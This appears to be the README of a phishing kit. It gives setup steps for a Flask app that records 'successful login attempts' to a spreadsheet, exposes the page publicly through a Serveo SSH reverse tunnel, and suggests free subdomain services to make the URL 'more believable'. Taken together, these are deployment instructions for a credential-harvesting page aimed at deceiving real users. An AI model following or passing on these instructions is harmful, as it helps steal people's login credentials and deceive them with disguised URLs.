# How to use

1. Install required libraries from `requirements.txt` by  
   ```bash
   pip install -r requirements.txt
   ```

2. Run the Flask application with  
   ```bash
   python app.py
   ```

3. The Flask app will start on your `localhost:port`.  
   Host the app from your device locally using a tunnel like **Serveo**.

4. To host it on Serveo, open PowerShell and type:  
   ```bash
   ssh -R 80:localhost:port serveo.net
   ```
   *Note: replace `localhost:port` with the actual address, like `127.0.0.1:5000`.*

5. Use the generated URL to open the website.

6. **Congratulations!** You've successfully completed the setup.  
   Successful login attempts will be saved in `submissions.xlsv`.

---

### Misc

Use services like [freedns.afraid.org](https://freedns.afraid.org) to generate alternative, more believable URLs.  
*(FreeDNS is a free subdomain provider.)*
````
